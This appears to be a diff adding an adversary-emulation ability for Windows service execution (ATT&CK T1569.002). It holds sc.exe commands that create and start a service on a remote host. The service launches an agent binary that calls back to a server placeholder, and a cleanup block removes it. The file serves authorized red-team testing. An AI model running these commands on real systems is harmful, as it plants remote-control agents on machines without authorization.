@@ -1,0 +1,24 @@
+- id: 95727b87-175c-4a69-8c7a-a5d82746a753
+  name: Service Creation
+  description: Create a service named "sandsvc" to execute remote 54ndc57 binary named "s4ndc4t.exe"
+  tactic: execution
+  technique:
+    attack_id: T1569.002
+    name: 'System Services: Service Execution'
+  platforms:
+    windows:
+      psh:
+        timeout: 300
+        cleanup: |
+          sc.exe \\#{remote.host.fqdn} stop sandsvc;
+          sc.exe \\#{remote.host.fqdn} delete sandsvc /f;
+          taskkill /s \\#{remote.host.fqdn} /FI "Imagename eq s4ndc4t.exe"
+        command: |
+          sc.exe \\#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= "cmd /c start C:\Users\Public\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}" displayname= "Sandcat Execution";
+          sc.exe \\#{remote.host.fqdn} start sandsvc;
+          Start-Sleep -s 15;
+          Get-Process -ComputerName #{remote.host.fqdn} s4ndc4t;
+  singleton: True
+  requirements:
+    - plugins.stockpile.app.requirements.no_backwards_movement:
+        - source: remote.host.fqdn
